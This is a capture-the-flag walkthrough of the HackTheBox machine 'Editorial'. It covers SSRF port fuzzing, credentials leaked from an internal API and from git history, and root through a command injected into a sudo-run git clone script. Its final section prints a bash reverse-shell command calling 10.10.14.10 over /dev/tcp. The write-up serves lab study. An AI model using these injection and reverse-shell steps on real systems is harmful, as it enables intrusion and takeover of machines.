### NMAP

```
sudo nmap -sC -vv -sV -oN nmap-editorial 10.10.11.20
```

![[HackTheBox/Linux/attachments/Pasted image 20250508232952.png]]
- 22,80

Add `editorial.htb` to `/etc/hosts`


### Enumerate website

Try to find which framework is running..
- view page source (nothing)
- check cookies in developer tools > storage tab (nothing)
- view 404 pages 

404 page
![[HackTheBox/Linux/attachments/Pasted image 20250508233319.png]]
- flat web server based on this 404

See default 404 pages for various sites:
Check 0xdf website > cheatsheets > [default 404 pages](https://0xdf.gitlab.io/cheatsheets/404)

The Flask 404 page matches our website's 404

*Framework: Flask*

Found a subscribe to newsletter box. 

Enter in an email and intercept with Burp.
![[HackTheBox/Linux/attachments/Pasted image 20250508233808.png]]

Burp gets nothing and nothing in dev tools... So the subscribe box does nothing.

Found a publish with us page with several contact form boxes and a file upload option..
![[HackTheBox/Linux/attachments/Pasted image 20250508234018.png]]

If you see a URL try Server Side Request Forgery: 

Enter Kali IP and Port 

![[HackTheBox/Linux/attachments/Pasted image 20250508234137.png]]

Set up nc listener 

```
nc -lvnp 8000
```

Site does make a request back to us 
![[HackTheBox/Linux/attachments/Pasted image 20250508234225.png]]

Maybe try to google vulnerabilities in this python requests library
![[HackTheBox/Linux/attachments/Pasted image 20250508234310.png]]
- no interesting vulns for this one tho

-------------------
### NMAP for IPv6 

Set up nc listener on ipv6

```
nc -6 -lvnp 9001
```

Get our kali ipv6 address
```
ip -6 addr
```

![[HackTheBox/Linux/attachments/Pasted image 20250508234811.png]]

Within the SSRF contact form > send to repeater 

Add Kali IPv6 instead of IPv4 to request along with port 9001

![[HackTheBox/Linux/attachments/Pasted image 20250508234959.png]]

Now we can see the server's IPv6 
![[HackTheBox/Linux/attachments/Pasted image 20250508235029.png]]

Run nmap against the server's ipv6 address
```
sudo nmap -6 -vv -oA nmap-ipv6 <server-ipv6-address>
```

![[HackTheBox/Linux/attachments/Pasted image 20250508235158.png]]
- 22 only 
ipv6 is a dead end
------------------------
### Enumerate open ports on the box

Using Burp repeater - port 22
![[HackTheBox/Linux/attachments/Pasted image 20250508235334.png]]
Response 
![[HackTheBox/Linux/attachments/Pasted image 20250508235401.png]]

### FFUF
To fuzz all the ports, add FUZZ within the Burp request and copy the request to a file called ssrf.req
![[HackTheBox/Linux/attachments/Pasted image 20250508235545.png]]

ffuf command
```
ffuf -request ssrf.req -request-proto http -w <(seq 1 65535) -fs 61
```

We can also filter based on the regex Burp response 
![[HackTheBox/Linux/attachments/Pasted image 20250508235900.png]]

So it will be whenever we don't get that 16307.. string 

```
ffuf -request ssrf.req -request-proto http -w <(seq 1 65535) -fr "16307..jpeg"
```

FFUF output shows **port 5000** will give us something unique. 

Checking it out with Burp
![[HackTheBox/Linux/attachments/Pasted image 20250509000142.png]]

Response 
![[HackTheBox/Linux/attachments/Pasted image 20250509000201.png]]

Navigate to this directory in the browser
![[HackTheBox/Linux/attachments/Pasted image 20250509000258.png]]
- which is giving us a file

Curling this file 
```
curl http://editorial.htb/static/uploads/2387327-43739-32897623
```
![[HackTheBox/Linux/attachments/Pasted image 20250509000357.png]]
- bunch of json data

View this data more easily with | jq .
```
curl http://editorial.htb/static/uploads/2387327-43739-32897623 | jq .
```
![[HackTheBox/Linux/attachments/Pasted image 20250509183748.png]]

Result - looks like these are api endpoints 
![[HackTheBox/Linux/attachments/Pasted image 20250509183910.png]]

Trying to request these endpoints in Burp leads to nothing for most of them. 
![[HackTheBox/Linux/attachments/Pasted image 20250509184035.png]]
Response
![[HackTheBox/Linux/attachments/Pasted image 20250509184053.png]]
One of the endpoints does give info! 
![[HackTheBox/Linux/attachments/Pasted image 20250509184144.png]]

Here is the Burp request for this 
![[HackTheBox/Linux/attachments/Pasted image 20250509184251.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250509184329.png]]
- Grab this UUID and use with curl to view the response 

```
curl http://editorial.htb/static/uploads/7e1ef09e-43739-32897623
```
We get a message with credentials
![[HackTheBox/Linux/attachments/Pasted image 20250509184501.png]]
- `dev:dev080217_devAPI!@`

Here's some better formatting 
![[HackTheBox/Linux/attachments/Pasted image 20250509184713.png]]

### SSH into User Account Using Found Creds

```
ssh dev@10.10.11.20
```

![[HackTheBox/Linux/attachments/Pasted image 20250509184828.png]]

❗got initial access❗

### Enumerating for priv esc 

Looking through apps directory in the dev user's home

```
ls -la
```

![[HackTheBox/Linux/attachments/Pasted image 20250509185021.png]]
- there's a `.git` directory

### Enumerate .git directory

Run 

```
git log
```

Also where "prod" is the name of a group on this box. This searches all of the diffs for the work "prod"

```
git log -Gprod
```

![[HackTheBox/Linux/attachments/Pasted image 20250509185438.png]]

Select the first hash and run to see the change
```
git show <HASH>
```

![[HackTheBox/Linux/attachments/Pasted image 20250509185646.png]]
- the lone that was removed shows another credential for prod user 
- `prod:080217_Producti0n_2023!@`

You can also search for the string password with 
```
git log -Gpassword
```

Switch to the prod user 
```
su - prod
```

Navigate to `/opt/internal_apps/clone_changes` and view the `clone_prod_change.py` script

![[HackTheBox/Linux/attachments/Pasted image 20250509190110.png]]

### Enumerate for priv esc to root
Run `sudo -l`

![[HackTheBox/Linux/attachments/Pasted image 20250509190205.png]]
- we can execute `clone_prod_change.py` as root

Let's find a vulnerability in this script 
![[HackTheBox/Linux/attachments/Pasted image 20250509190313.png]]
- one place for user input: `url_to_clone`

Google "exploit git repo python" and discover there is an RCE

![[HackTheBox/Linux/attachments/Pasted image 20250509190512.png]]

Execute the script using a similar PoC
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/PleaseSubscribe'
```

It says that it failed BUT 
![[HackTheBox/Linux/attachments/Pasted image 20250509190807.png]]

Looking at /tmp, we see PleaseSubscribe
![[HackTheBox/Linux/attachments/Pasted image 20250509190837.png]]
- we have code execution...

### Get Reverse Shell with this CVE

Remember to encodeee
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c bash% -c% 'bash% -i% >&% /dev/tcp/10.10.14.10/9001% 0>&1'"
```

Set up nc listener
```
nc -lvnp 9001
```

![[HackTheBox/Linux/attachments/Pasted image 20250509191221.png]]
⭐ GOT ROOT ⭐


